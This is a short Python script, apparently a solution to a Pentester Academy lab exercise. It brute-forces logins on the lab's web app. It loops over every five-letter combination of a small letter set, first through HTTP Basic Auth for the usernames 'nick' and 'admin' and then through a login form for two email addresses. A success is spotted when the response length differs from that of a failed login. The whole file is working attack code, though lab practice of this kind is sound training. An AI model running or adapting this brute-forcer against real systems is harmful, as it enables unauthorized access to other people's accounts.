import itertools
import requests
import base64

password=(list(map("".join, itertools.product('vie', repeat=5))))
usernameList=['nick','admin']
baseauthUname=""
baseauthpwd=""
for username in usernameList:
	for passw in password:
		url='http://pentesteracademylab.appspot.com/lab/webapp/auth/form/1'
		attribs=username+":"+passw
		message_bytes = attribs.encode('ascii')
		base64_bytes = base64.b64encode(message_bytes)
		encoded = base64_bytes.decode('ascii')
		r=requests.post(url=url, headers={"Authorization": "Basic %s" % encoded})
		if ("Unauthorized" not in r.text):
			print (username)
			#baseauthUname=username
			print (passw)
			#baseauthpwd=passw
			print ("Trying HTTP login")
			emails=["nick@pentesteracademy.com","admin@pentesteracademy.com"]
			passwords=(list(map("".join, itertools.product('mno', repeat=5))))
			for email in emails:
				for passws in passwords:
					crds={'email':email,'password':passws}
					r1=requests.post(url=url, headers={"Authorization": "Basic %s" % encoded},data=crds)
					#print (r1.headers['Content-Length']) #I noticed length is 4507 for failed login
					if(int(r1.headers['Content-Length'])!=4507):
						print (email)
						print (passws)
						break
	
			

